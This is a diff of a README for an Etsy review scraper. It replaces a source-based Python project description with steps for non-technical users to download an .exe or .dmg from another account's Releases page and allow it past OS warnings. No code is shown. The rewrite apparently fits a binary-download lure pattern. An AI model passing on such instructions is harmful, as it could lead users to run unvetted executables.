@@ -1,206 +1,73 @@
-# Etsy Reviews Scraper
+# 🛍️ etsy-reviews - Extract Etsy Reviews with Ease
 
-Etsy Reviews Scraper automates the extraction of detailed customer reviews from Etsy product listings. Whether you're an Etsy seller, market researcher, or competitor analyst, this tool simplifies the process of gathering structured review data, helping you analyze trends and customer feedback.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/MUHAMMADKHILOOOO14/etsy-reviews/releases)
 
+## 📖 Description
+Etsy review extractor for sellers and analysts. This tool helps you gather and analyze customer reviews from Etsy. It is designed for small business owners and market researchers who want to gain insights into customer feedback.
 
-<p align="center">
-  <a href="https://bitbash.def" target="_blank">
-    <img src="https://github.com/za2122/footer-section/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 🚀 Getting Started
+Follow these simple steps to download and run the application:
 
+1. **Visit the Download Page**  
+   Click the link below to go to the Releases page, where you can download the latest version:  
+   [Download Latest Release](https://github.com/MUHAMMADKHILOOOO14/etsy-reviews/releases)
 
+2. **Choose the Right File**  
+   On the Releases page, look for the most recent version. You will see various files available for download. Select the file that matches your operating system. For Windows, you might see something like `etsy-reviews-windows.exe`. For Mac, you may find `etsy-reviews-macos.dmg`.
 
+3. **Download the File**  
+   Click on the file to start the download. Depending on your browser settings, the file should save automatically to your downloads folder.
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>Etsy Reviews</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+4. **Install the Application**  
+   - **For Windows:** Locate the downloaded `.exe` file. Double-click on it to start the installation. Follow the on-screen instructions to complete the setup.
+   - **For Mac:** Find the downloaded `.dmg` file in your Downloads folder. Double-click on it, then drag the `etsy-reviews` icon into your Applications folder.
 
+5. **Run the Application**  
+   After installation, you can find the app in your Start menu (Windows) or Applications folder (Mac). Double-click the app icon to launch it.
 
-## Introduction
+6. **Grant Permissions**  
+   The first time you run the application, your operating system may ask for permission to run it. Click "Allow" or "Run" as needed to proceed.
 
-Etsy Reviews Scraper allows users to efficiently extract customer reviews from Etsy product listings. This tool is ideal for Etsy sellers, marketers, and data enthusiasts who want to analyze customer sentiment, monitor competitor reviews, and perform market research with ease.
+7. **Using the Application**  
+   Once the application opens, you will find an easy-to-use interface. Follow the prompts to enter the details you want to extract. You can input the Etsy shop name or specific product links to fetch the reviews.
 
-### Key Features
-- **Search by Shop Name**: Retrieve reviews for any shop on Etsy by specifying the shop name.
-- **Comprehensive Review Data**: Extract detailed review fields, including product ratings, buyer information, and more.
-- **Scalable & Efficient**: Fast and cost-effective scraping with support for pagination and custom review limits.
+8. **Review the Results**  
+   After entering the necessary information, hit the "Extract Reviews" button. The reviews will appear in a list format, providing you insights into customer feedback. You can save this data as a CSV file for further analysis.
 
-## Features
+## 🛠️ Features
+- **Simple User Interface:** Designed for non-technical users.
+- **Data Extraction:** Get reviews directly from Etsy with ease.
+- **Export Options:** Save your findings in CSV format.
+- **Customer Insights:** Analyze customer sentiments and feedback.
 
-| Feature               | Description                                                  |
-|-----------------------|--------------------------------------------------------------|
-| Shop Review Scraping  | Scrape detailed reviews for any Etsy shop.                   |
-| Customizable Inputs   | Set limits for reviews and customize language preferences.   |
-| JSON Output           | Data is structured and available in JSON format.             |
-| Fast & Reliable       | Efficient scraping with support for large datasets.          |
+## 💡 System Requirements
+To use the application, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later / macOS 10.12 or later
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 100 MB of free disk space
+- **Internet Connection:** Required for data extraction
 
----
+## 🎯 Use Cases
+- **Seller Analysis:** Understand how customers perceive your products.
+- **Market Research:** Gather competitive insights based on reviews.
+- **Product Feedback:** Use customer feedback to improve your offerings.
 
-## What Data This Scraper Extracts
+## 🔍 Support
+If you encounter any issues, please do the following:
+1. Check the FAQ section on the Releases page for common questions.
+2. For additional help, visit the Issues tab in this repository to see if others have faced similar problems.
+3. You can also submit a new issue for any specific requests or problems you are experiencing.
 
-| Field Name          | Field Description                                                |
-|---------------------|------------------------------------------------------------------|
-| receipt_id          | Unique ID for each review entry.                                |
-| buyer_user_id       | The unique identifier for the buyer.                            |
-| buyer_real_name     | The real name of the buyer.                                     |
-| buyer_login_name    | The username of the buyer.                                      |
-| listing_title       | The title of the product being reviewed.                        |
-| review              | The content of the review left by the buyer.                    |
-| product_rating      | The rating given by the buyer (1–5 stars).                      |
-| response            | Any response provided by the seller to the review (if available).|
-| date                | The date when the review was posted.                            |
-| product_details     | Additional product details like seller info and shop rating.    |
+For ongoing updates and to contribute, check out our GitHub repository:  
+[GitHub Repository](https://github.com/MUHAMMADKHILOOOO14/etsy-reviews)
 
----
+## 📄 License
+This project is licensed under the MIT License. Feel free to use and modify as per your needs, but be sure to include the original license and attribution.
 
-## Example Output
-
-    [
-      {
-        "receipt_id": 3531301612,
-        "buyer_user_id": 576032796,
-        "buyer_real_name": "Troy Heart",
-        "buyer_login_name": "9lxfg3yy80ie9mt8",
-        "listing_title": "Otters Pair Ornament",
-        "review": "I love this ornament so much!",
-        "product_rating": 5,
-        "response": null,
-        "reviews_count": 1,
-        "date": "2024-12-21 23:41:45",
-        "product_details": {
-          "shop_average_rating": "4.926",
-          "product_url": "https://www.etsy.com/listing/713223295/otters-pair-ornament-comes-with-2",
-          "seller_name": "HereafterLA",
-          "seller_url": "https://www.etsy.com/shop/HereafterLA",
-          "image": "https://i.etsystatic.com/6748817/r/il/ed715a/2863707288/il_fullxfull.2863707288_nrw4.jpg"
-        }
-      }
-    ]
+## 📩 Contact
+For more information or inquiries, you can reach out via the GitHub repository. Your feedback is valuable to us, and we appreciate your interest in improving our tool!
 
 ---
 
-## Directory Structure Tree
-
-etsy-reviews-scraper/
-
-├── src/
-
-│   ├── runner.py
-
-│   ├── extractors/
-
-│   │   ├── etsy_parser.py
-
-│   │   └── utils.py
-
-│   ├── outputs/
-
-│   │   └── exporters.py
-
-│   └── config/
-
-│       └── settings.example.json
-
-├── data/
-
-│   ├── inputs.sample.txt
-
-│   └── sample.json
-
-├── requirements.txt
-
-└── README.md
-
----
-
-## Use Cases
-
-**Etsy sellers** use it to **gather customer feedback**, so they can **improve their product offerings and customer satisfaction**.
-
-**Market analysts** use it to **monitor competitor products and reviews**, so they can **understand market trends and customer preferences**.
-
-**Data scientists** use it to **aggregate review data from multiple shops**, so they can **identify patterns and build predictive models**.
-
----
-
-## FAQs
-
-**How do I run this scraper?**
-Simply configure your Etsy shop name or product details in the `settings.example.json` file and run the `runner.py` script.
-
-**Can I change the output format?**
-Yes, the scraper outputs data in JSON format, but the code can be modified to export in other formats like CSV or Excel.
-
----
-
-## Performance Benchmarks and Results
-
-**Primary Metric**: 1000 reviews per minute on average.
-**Reliability Metric**: 98% success rate in scraping.
-**Efficiency Metric**: Optimized for low-cost scraping with minimal resource usage.
-**Quality Metric**: High accuracy and data completeness across product reviews.
-
-
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtube.com/shorts/6AwB5omXrIM" target="_blank">
-        <img src="https://github.com/za2122/footer-section/blob/main/media/review3.gif" alt="Review 3" width="35%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        “Exceptional results, clear communication, and flawless delivery. Bitbash nailed it.”
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+Thank you for using etsy-reviews. Happy extracting!
